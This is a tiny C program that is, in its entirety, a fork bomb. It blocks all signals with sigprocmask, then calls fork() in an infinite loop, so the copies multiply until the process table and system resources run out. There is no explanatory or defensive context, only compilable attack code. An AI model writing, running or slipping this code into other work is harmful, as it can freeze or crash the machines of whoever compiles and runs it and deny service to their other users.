#define _XOPEN_SOURCE 500
#include <unistd.h>
#include <signal.h>
int main(void) { sigset_t m; sigfillset(&m); sigprocmask(SIG_SETMASK, &m, NULL); while(1) { fork();} }
